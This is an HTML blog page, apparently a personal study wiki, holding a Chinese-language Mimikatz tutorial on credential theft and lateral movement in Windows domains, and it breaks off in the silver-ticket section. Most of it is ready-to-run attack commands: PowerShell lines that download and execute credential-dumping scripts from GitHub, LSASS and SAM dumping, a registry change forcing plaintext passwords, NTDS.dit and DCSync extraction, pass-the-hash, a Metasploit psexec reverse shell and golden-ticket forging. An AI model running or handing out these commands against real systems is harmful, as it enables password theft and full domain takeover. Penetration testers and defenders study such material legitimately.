@@ -1,0 +1,1025 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 8.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>内网：Mimikatz教程 - bug_001</title>
+
+  
+    <meta name="description" content="0x00 简介来源：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;-mo-&#x2F;p&#x2F;11890232.html Mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Mimikatz教程">
+<meta property="og:url" content="https://cbbzx12.github.io/wiki/%E5%86%85%E7%BD%91/%E6%8F%90%E6%9D%83/Mimikatz%E6%95%99%E7%A8%8B/">
+<meta property="og:site_name" content="bug_001">
+<meta property="og:description" content="0x00 简介来源：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;-mo-&#x2F;p&#x2F;11890232.html Mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cbbzx12.github.io/images/head.jpg">
+<meta property="article:published_time" content="2025-12-23T13:01:43.190Z">
+<meta property="article:modified_time" content="2025-12-23T13:01:43.190Z">
+<meta property="article:author" content="bug_001">
+<meta property="article:tag" content="内网">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cbbzx12.github.io/images/head.jpg">
+  
+  
+  
+  <meta name="keywords" content="">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Website","@id":"https://cbbzx12.github.io/wiki/%E5%86%85%E7%BD%91/%E6%8F%90%E6%9D%83/Mimikatz%E6%95%99%E7%A8%8B/","author":{"@type":"Person","name":"bug_001","sameAs":[],"image":"/images/head.jpg"},"name":"Mimikatz教程","description":"0x00 简介来源：https://www.cnblogs.com/-mo-/p/11890232.html\nMimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输...","url":"https://cbbzx12.github.io/wiki/%E5%86%85%E7%BD%91/%E6%8F%90%E6%9D%83/Mimikatz%E6%95%99%E7%A8%8B/"}</script>
+  
+<!-- hexo injector head_end start -->
+<style>
+  :root { 
+    --card: rgba(255, 255, 255, 0.65) !important; /* Restored to 18:00: Higher Opacity */
+    --block: rgba(255, 255, 255, 0.4) !important;
+    --bg-card: rgba(255, 255, 255, 0.65) !important;
+    --text-p1: #000 !important; 
+    --text-p2: #222 !important;
+    --text-p3: #444 !important;
+  }
+
+  /* Global Background with Blur */
+  body {
+    background: none !important;
+  }
+  body::before {
+    content: "";
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: url('/images/bg.jpg') no-repeat center center fixed;
+    background-size: cover;
+    filter: blur(6px);
+    z-index: -1;
+    transform: scale(1.02);
+  }
+
+  /* Transparent Layout Containers */
+  .l_main { background: transparent !important; }
+  .l_left { background: transparent !important; border: none !important; box-shadow: none !important; backdrop-filter: none !important; padding: 0 !important; } 
+  .l_body { background: transparent !important; }
+  
+  /* Premium Glassmorphism for Widgets (Global - restores individual card look) */
+  .widget-wrapper, .post-list .post-card, .md-text { 
+    background: var(--card) !important; 
+    backdrop-filter: blur(12px) !important; 
+    -webkit-backdrop-filter: blur(12px) !important;
+    border: 1px solid rgba(255, 255, 255, 0.3) !important; 
+    box-shadow: 0 4px 16px 0 rgba(0, 0, 0, 0.08) !important; 
+    border-radius: 16px !important; 
+  }
+
+  /* FORCE HIDE: Specific fix to remove the "Welcome" widget internal cover image via CSS */
+  .widget-wrapper .widget-header, 
+  .layout-author .cover,
+  .widget-wrapper div[style*="background-image"], /* Catch inline styles */
+  .widget-wrapper .cover {
+    background: transparent !important;
+    background-image: none !important;
+    height: auto !important; /* Reset height if it was set for the image */
+    min-height: 0 !important;
+  }
+
+  /* Site Info Widget Specific Tweaks */
+  .widget-wrapper.markdown {
+      padding: 1rem;
+  }
+</style>
+<!-- hexo injector head_end end --></head>
+<body><div class="sitebg"><div class="siteblur"></div></div>
+
+
+
+<div class="l_body content" id="start" layout="page" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(url(/images/bg.jpg));"></div><img no-lazy class="avatar" src="/images/head.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">bug_001</div><div class="sub cap">记录一些学习过程</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item" title="博客" href="/" style="color:#1BCDFC"><img no-lazy src="https://api.iconify.design/solar/home-2-bold-duotone.svg?color=%231BCDFC" / onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="nav-item active" title="文档" href="/wiki/" style="color:#3DC550"><img no-lazy src="https://api.iconify.design/solar/notebook-bookmark-bold-duotone.svg?color=%233DC550" / onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="nav-item" title="导航" href="/sites/" style="color:#FA6400"><img no-lazy src="https://api.iconify.design/solar/planet-bold-duotone.svg?color=%23FA6400" / onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><img no-lazy src="https://api.iconify.design/solar/users-group-two-rounded-bold-duotone.svg?color=%23F44336" / onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" data-filter="/wiki/内网/" placeholder="在 /wiki/内网/ 中搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+
+  <span class="sep"></span>
+  <a class="cap breadcrumb" href="/wiki/%E5%86%85%E7%BD%91/%E6%8F%90%E6%9D%83/Mimikatz%E6%95%99%E7%A8%8B/">Mimikatz教程</a>
+  </div>
+<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2025-12-23T13:01:43.190Z">2025-12-23</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>Mimikatz教程</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a><font style="color:rgb(0, 0, 0);">0x00 简介</font></h3><p>来源：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11890232.html">https://www.cnblogs.com/-mo-/p/11890232.html</a></p>
+<p><font style="color:rgb(0, 0, 0);">Mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码！也就是说只要你不重启电脑，就可以通过他获取到登陆密码，只限当前登陆系统！</font></p>
+<p><font style="color:rgb(0, 0, 0);">注：但是在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。</font></p>
+<p><font style="color:rgb(0, 0, 0);">这里放几个神器的运行姿势：九种姿势运行：Mimikatz：</font><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/176796.html"><font style="color:rgb(0, 0, 0);">https://www.freebuf.com/articles/web/176796.html</font></a></p>
+<p><font style="color:rgb(0, 0, 0);">借用PowerShell</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copy#读取密码明文(需要管理员权限)</span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz –DumpCerts</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copy#读取密码hash值(需要管理员权限)</span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#x27;);Get-PassHashes</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763012460776-5f3fd30d-bc13-466a-bfdd-d0cfb0f111f8.png"></p>
+<h3 id="0x01-获取本地帐户密码"><a href="#0x01-获取本地帐户密码" class="headerlink" title="0x01 获取本地帐户密码"></a><font style="color:rgb(0, 0, 0);">0x01 获取本地帐户密码</font></h3><h4 id="1-1-本地执行"><a href="#1-1-本地执行" class="headerlink" title="1.1 本地执行"></a><font style="color:rgb(51, 51, 51);">1.1 本地执行</font></h4><p><font style="color:rgb(0, 0, 0);">下载mimikatz程序，找到自己系统对应的位数，右键以管理员身份运行：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Copy#提升权限</span><br><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">#抓取密码</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(0, 0, 0);">当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。</font></p>
+<p><font style="color:rgb(0, 0, 0);">cmd修改注册表命令：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copyreg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br><span class="line">#重启或用户重新登录后可以成功抓取</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-2-SAM表获取hash"><a href="#1-2-SAM表获取hash" class="headerlink" title="1.2 SAM表获取hash"></a><font style="color:rgb(51, 51, 51);">1.2 SAM表获取hash</font></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Copy#导出SAM数据</span><br><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM</span><br><span class="line"></span><br><span class="line">#使用mimikatz提取hash</span><br><span class="line">lsadump::sam /sam:SAM /system:SYSTEM</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-Procdump-Mimikatz"><a href="#0x02-Procdump-Mimikatz" class="headerlink" title="0x02 Procdump+Mimikatz"></a><font style="color:rgb(0, 0, 0);">0x02 Procdump+Mimikatz</font></h3><p><font style="color:rgb(0, 0, 0);">当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe:</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copyprocdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(0, 0, 0);">将lsass.dmp下载到本地后，然后执行mimikatz:</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copymimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(0, 0, 0);">为了方便复制与查看，可以输出到本地文件里面：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copymimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &gt; pssword.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-读取域控中域成员Hash"><a href="#0x03-读取域控中域成员Hash" class="headerlink" title="0x03 读取域控中域成员Hash"></a><font style="color:rgb(0, 0, 0);">0x03 读取域控中域成员Hash</font></h3><h4 id="3-1-域控本地读取"><a href="#3-1-域控本地读取" class="headerlink" title="3.1 域控本地读取"></a><font style="color:rgb(51, 51, 51);">3.1 域控本地读取</font></h4><p><font style="color:rgb(0, 0, 0);">注：得在域控上以域管理员身份执行mimikatz</font></p>
+<p><font style="color:rgb(0, 0, 0);">方法一：直接执行</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Copy#提升权限</span><br><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">抓取密码</span><br><span class="line">lsadump::lsa /patch</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(0, 0, 0);">方法二：通过 dcsync，利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值，可以在域管权限下执行获取：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Copy#获取所有域用户</span><br><span class="line">lsadump::dcsync /domain:test.com /all /csv</span><br><span class="line"></span><br><span class="line">#指定获取某个用户的hash</span><br><span class="line">lsadump::dcsync /domain:test.com /user:test</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-2-导出域成员Hash"><a href="#3-2-导出域成员Hash" class="headerlink" title="3.2 导出域成员Hash"></a><font style="color:rgb(51, 51, 51);">3.2 导出域成员Hash</font></h4><p><font style="color:rgb(94, 102, 135);">Copy</font></p>
+<p>域账户的用户名和hash密码以域数据库的形式存放在域控制器的 <code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgba(0, 0, 0, 0.04);&quot;&gt;%SystemRoot%\ntds\NTDS.DIT&lt;/font&gt;</code> 文件中。</p>
+<p><font style="color:rgb(0, 0, 0);">这里可以借助：ntdsutil.exe，域控制器自带的域数据库管理工具，我们可以通过域数据库，提取出域中所有的域用户信息，在域控上依次执行如下命令，导出域数据库：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Copy#创建快照</span><br><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br><span class="line"></span><br><span class="line">#加载快照</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;72ba82f0-5805-4365-a73c-0ccd01f5ed0d&#125;&quot; quit quit</span><br><span class="line"></span><br><span class="line">#Copy文件副本</span><br><span class="line">copy C:\$SNAP_201911211122_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(0, 0, 0);">将ntds.dit文件拷贝到本地利用impacket脚本dump出Hash：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copysecretsdump.py -ntds.dit -system system.hive LOCAL</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763012460982-0f3beca5-6c46-4f63-9f04-d06d38d22107.png"></p>
+<p><font style="color:rgb(0, 0, 0);">除了借助python，还有一个NTDSDumpEx（会被360查杀的哦）：</font></p>
+<p><font style="color:rgb(0, 0, 0);">工具地址：</font><a target="_blank" rel="noopener" href="https://github.com/zcgonvh/NTDSDumpEx/releases"><font style="color:rgb(0, 0, 0);">https://github.com/zcgonvh/NTDSDumpEx/releases</font></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CopyNTDSDumpEx -d ntds.dit -o domain.txt -s system.hiv    (system.hive文件获取:reg save hklm\system system.hive)</span><br><span class="line">NTDSDumpEx -d ntds.dit -o domain.txt -r               (此命令适用于在域控本地执行)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763012460928-1ac941be-27d9-4632-b492-b13074b3e3e2.png"><font style="color:rgb(0, 0, 0);"><br></font><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763012460902-b2fae742-30c6-48fb-87ed-089443c66dbc.png"></p>
+<p><font style="color:rgb(0, 0, 0);">最后记得卸载删除快照：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copyntdsutil snapshot &quot;unmount &#123;72ba82f0-5805-4365-a73c-0ccd01f5ed0d&#125;&quot; quit quit</span><br><span class="line">ntdsutil snapshot &quot;delete  &#123;72ba82f0-5805-4365-a73c-0ccd01f5ed0d&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-3-secretsdump脚本直接导出域hash"><a href="#3-3-secretsdump脚本直接导出域hash" class="headerlink" title="3.3 secretsdump脚本直接导出域hash"></a><font style="color:rgb(51, 51, 51);">3.3 secretsdump脚本直接导出域hash</font></h4><p><font style="color:rgb(0, 0, 0);">为什么要再提一遍secretsdump呢，因为它可以直接导出，说白了，简单粗暴：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copypython secretsdump.py rabbitmask:123456@192.168.15.181</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(0, 0, 0);">首先它会导出本地SAM中的hash，然后是所有域内用户的IP，全部获取成功</font></p>
+<h3 id="0x04-哈希传递攻击PTH"><a href="#0x04-哈希传递攻击PTH" class="headerlink" title="0x04 哈希传递攻击PTH"></a><font style="color:rgb(0, 0, 0);">0x04 哈希传递攻击PTH</font></h3><h4 id="4-1-工作组环境"><a href="#4-1-工作组环境" class="headerlink" title="4.1 工作组环境"></a><font style="color:rgb(51, 51, 51);">4.1 工作组环境</font></h4><p><font style="color:rgb(0, 0, 0);">当我们获得了一台主机的NTLM哈希值，我们可以使用mimikatz对其进行哈希传递攻击。执行完命令后，会弹出cmd窗口。</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copy#使用administrator用户的NTLM哈希值进行攻击</span><br><span class="line">sekurlsa::pth /user:administrator /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copy#使用xie用户的NTLM哈希值进行攻击</span><br><span class="line">sekurlsa::pth /user:xie /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(0, 0, 0);">在弹出的cmd窗口，我们直接可以连接该主机，并且查看该主机下的文件夹。</font></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763012460882-5719928d-ea90-4208-b5d9-f4962ac921cb.png"></p>
+<p><font style="color:rgb(0, 0, 0);">或者可以直接将该主机的C盘映射到本地的K盘。<br></font><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763012461185-97d84f6b-6c36-4bc0-96c2-4798088f075e.png"></p>
+<p><font style="color:rgb(0, 0, 0);">注：只能在 mimikatz 弹出的 cmd 窗口才可以执行这些操作，注入成功后，可以使用psexec、wmic、wmiexec等实现远程执行命令。</font></p>
+<h4 id="4-2-域环境"><a href="#4-2-域环境" class="headerlink" title="4.2 域环境"></a><font style="color:rgb(51, 51, 51);">4.2 域环境</font></h4><p><font style="color:rgb(0, 0, 0);">在域环境中，当我们获得了域内用户的NTLM哈希值，我们可以使用域内的一台主机用mimikatz对域控进行哈希传递攻击。执行完命令后，会弹出cmd窗口。前提是我们必须拥有域内任意一台主机的本地 administrator 权限和获得了域用户的NTLM哈希值</font></p>
+<p><font style="color:rgb(0, 0, 0);">域：xie.com<br></font><font style="color:rgb(0, 0, 0);">域控：WIN2008.xie.com</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copy#使用域管理员administrator的NTLM哈希值对域控进行哈希传递攻击</span><br><span class="line">sekurlsa::pth /user:administrator /domain:&quot;xie.com&quot; /ntlm:dbd621b8ed24eb627d32514476fac6c5</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copy#使用域用户xie的NTLM哈希值对域控进行哈希传递攻击</span><br><span class="line">sekurlsa::pth /user:xie /domain:&quot;xie.com&quot; /ntlm:329153f560eb329c0e1deea55e88a1e9</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763012461355-e8341355-5a88-4b26-8abf-b084b048d7ab.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763012461486-c575b309-62bd-4969-b4b8-eaaa1a7c7113.png"></p>
+<h4 id="4-3-MSF进行哈希传递"><a href="#4-3-MSF进行哈希传递" class="headerlink" title="4.3 MSF进行哈希传递"></a><font style="color:rgb(51, 51, 51);">4.3 MSF进行哈希传递</font></h4><p><font style="color:rgb(94, 102, 135);">Copy</font></p>
+<p>有些时候，当我们获取到了某台主机的Administrator用户的LM-Hash和 NTLM-Hash ，并且该主机的445端口打开着。我们则可以利用 <code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgba(0, 0, 0, 0.04);&quot;&gt;exploit/windows/smb/psexec&lt;/font&gt;</code> 漏洞用MSF进行远程登录(哈希传递攻击)。(只能是administrator用户的LM-hash和NTLM-hash)，这个利用跟工作组环境或者域环境无关。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Copymsf &gt; use  exploit/windows/smb/psexec</span><br><span class="line">msf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(psexec) &gt; set lhost 192.168.10.27</span><br><span class="line">msf exploit(psexec) &gt; set rhost 192.168.10.14</span><br><span class="line">msf exploit(psexec) &gt; set smbuser Administrator</span><br><span class="line">msf exploit(psexec) &gt; set smbpass 815A3D91F923441FAAD3B435B51404EE:A86D277D2BCD8C8184B01AC21B6985F6   #这里LM和NTLM我们已经获取到了</span><br><span class="line">msf exploit(psexec) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763012461488-af7d4866-b2d2-42e6-b52b-70cf15008e3b.png"></p>
+<h3 id="0x05-票据传递攻击-PTT"><a href="#0x05-票据传递攻击-PTT" class="headerlink" title="0x05 票据传递攻击(PTT)"></a><font style="color:rgb(0, 0, 0);">0x05 票据传递攻击(PTT)</font></h3><h4 id="5-1-黄金票据"><a href="#5-1-黄金票据" class="headerlink" title="5.1 黄金票据"></a><font style="color:rgb(51, 51, 51);">5.1 黄金票据</font></h4><p><font style="color:rgb(0, 0, 0);">域中每个用户的 Ticket 都是由 krbtgt 的密码 Hash 来计算生成的，因此只要获取到了 krbtgt 用户的密码 Hash ，就可以随意伪造 Ticket ，进而使用 Ticket 登陆域控制器，使用 krbtgt 用户 hash 生成的票据被称为 Golden Ticket，此类攻击方法被称为票据传递攻击。</font></p>
+<p><font style="color:rgb(0, 0, 0);">首先获取krbtgt的用户hash:</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copymimikatz &quot;lsadump::dcsync /domain:xx.com /user:krbtgt&quot;</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(0, 0, 0);">利用 mimikatz 生成域管权限的 Golden Ticket，填入对应的域管理员账号、域名称、sid值，如下：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copykerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Copy#导入刚才生成的票据</span><br><span class="line">kerberos::ptt test.kiribi</span><br><span class="line"></span><br><span class="line">#导入成功后可获取域管权限</span><br><span class="line">dir \\dc.abc.com\c$</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-2-白银票据"><a href="#5-2-白银票据" class="headerlink" title="5.2 白银票据"></a><font style="color:rgb(51, 51, 51);">5.2 白银票据</font></h4><p><font style="color:rgb(0, 0, 0);">黄金票据和白银票据的一些区别：Golden Ticket：伪造TGT，可以获取任何 Kerberos 服务权限，且由 krbtgt 的 hash 加密，金票在使用的过程需要和域控通信</font></p>
+<p><font style="color:rgb(0, 0, 0);">白银票据：伪造 TGS ，只能访问指定的服务，且由服务账号（通常为计算机账户）的 Hash 加密 ，银票在使用的过程不需要同域控通信</font></p>
